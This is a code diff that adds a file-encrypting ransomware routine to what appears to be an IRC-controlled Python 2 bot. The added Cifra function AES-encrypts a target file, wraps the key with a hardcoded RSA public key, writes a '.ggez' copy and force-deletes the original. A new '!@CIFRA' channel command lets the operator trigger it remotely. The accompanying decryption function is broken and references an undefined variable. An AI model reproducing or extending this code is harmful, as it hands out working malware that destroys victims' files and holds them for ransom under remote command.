@@ -3,6 +3,88 @@ import socket
 import random
 import os
 import subprocess
+import string
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+import Crypto
+from Crypto.PublicKey import RSA
+from Crypto import Random
+
+rsa_str = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDwlbp/XRIkDF8sKfjsk3mKpYxI5ljpO1mn+SOvJb/M18AhGzv6ViDDYzwmcFlASiEvnqKdLTC2W6F+mgzhIu8Aft0ZAi2aIJ2yU2TPR5MOxq55vzXulRF71hyy4sJVIXa8Q11XJJyzm5pmkbrmiaCZIOABzyf5WTcbepSq0I6dSQIDAQAB\n-----END PUBLIC KEY-----'
+rsa = RSA.importKey(rsa_str)
+
+def Cifra(fnamec):
+	"""
+	Recibe: La llave para cifrar el archivo y el nombre del archivo
+	Devuelve: Archivo cifrado usando AES como metodo de cifrado
+	"""
+	print "ENTREEEEE"
+	key = CreaLlave()
+	chunksize=64*1024
+	outputfile=fnamec+'.ggez'
+	filesize=str(os.path.getsize(fnamec)).zfill(16)
+	IV=''
+	llave_cifrada = CifraLlave(key)[0]
+	#print 'Logitud de la llave:',len(llave_cifrada)
+	for i in range(16):
+		IV+=chr(random.randint(0,0xff))
+	encryptor= AES.new(key, AES.MODE_CBC,IV)
+
+	with open(fnamec, 'rb') as infile:
+		with open(outputfile, 'wb') as outfile:
+			outfile.write(filesize)
+			outfile.write(IV)
+			outfile.write(llave_cifrada)
+
+			while True:
+				chunk =infile.read(chunksize)
+				if len(chunk)==0:
+					break
+				elif len(chunk) % 16 !=0:
+					chunk+=' '*(16-(len(chunk)%16))
+				outfile.write(encryptor.encrypt(chunk))
+	os.system('del /F /Q /A '+fnamec)
+
+def Descifra(key, fnamec):
+	"""
+	Recibe: La llave para descifrar el archivo y el nombre del archivo
+	Devuelve: Archivo descifrado usando AES como metodo de descifrado
+	"""
+	chunksize = 64*1024
+	outputFile = fnamec.replace('.ggez','')
+	
+	with open(fnamec, 'rb') as infile:
+		filesize = long(infile.read(16))
+		IV = infile.read(16)
+		llave_cifrada = ifile.read(128)
+		#Descifrar la llave AES con la llave privada RSA
+		decryptor = AES.new(key, AES.MODE_CBC, IV)
+
+		with open(outputFile, 'wb') as outfile:
+			while True:
+				chunk = infile.read(chunksize)
+
+				if len(chunk) == 0:
+					break
+
+				outfile.write(decryptor.decrypt(chunk))
+			outfile.truncate(filesize)
+
+
+def CreaLlave():
+	"""
+	Recibe: Un texto plano que servira ser una llave
+	Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
+	"""
+	abcd = string.ascii_lowercase
+	k = ''.join(random.choice(abcd) for i in range(random.randint(16,64)))
+	hasher=SHA256.new(k)
+	return hasher.hexdigest()[:16]
+
+	
+def CifraLlave(llave):
+	return rsa.encrypt(llave,32)
 
 def botName():
     values = list("123456789")
@@ -40,5 +122,12 @@ while 1:
          subprocess.call(['C:\\test.txt'])
      if msg.find("!@users")!=-1:
          print os.listdir('C:\\Users\\malware\\Documents')
+  	if msg.find("!@CIFRA") != -1:
+		irc.send("PRIVMSG "+channel+" :CIFRANDO!\r\n")
+		msg2=msg.split(' ')
+		try:
+			Cifra(msg2[4].replace('\r\n',''))
+		except Exception as e:
+			irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
      # Limpio el msg
      msg=""
